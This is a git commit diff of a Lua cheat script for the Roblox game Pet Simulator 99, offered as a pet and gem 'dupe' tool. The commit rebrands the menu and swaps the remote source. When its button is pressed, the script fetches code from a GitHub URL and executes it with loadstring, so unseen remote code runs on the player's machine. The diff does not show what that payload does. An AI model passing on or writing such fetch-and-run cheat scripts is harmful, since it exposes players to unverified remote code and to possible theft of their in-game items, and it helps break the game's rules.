14953430f626f1afd54b8d5683d7c49f934f8e5d
RuebanD <120219002+RuebanD@users.noreply.github.com>
2024-01-28 23:07:05 +0000

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Mori Scripts | :santa: Pet Simulator 99! :santa:", "BloodTheme")
+local Window = Library.CreateLib("RD Scripts | :santa: Pet Simulator 99! :santa:", "BloodTheme")
 
 -- MAIN
 local Main = Window:NewTab("Dupe Script")
@@ -7,6 +7,6 @@ local MainSection = Main:NewSection("Dupe Pets")
 
 MainSection:NewButton("Dupe Huges - Exclusives - GEMS !", "Duped Pets", function()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Pet-Sim-99-DUPE-/main/Pet%20Sim%2099%20DUPE", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RuebanD/mainps/main/main.lua", true))()
 
 end)
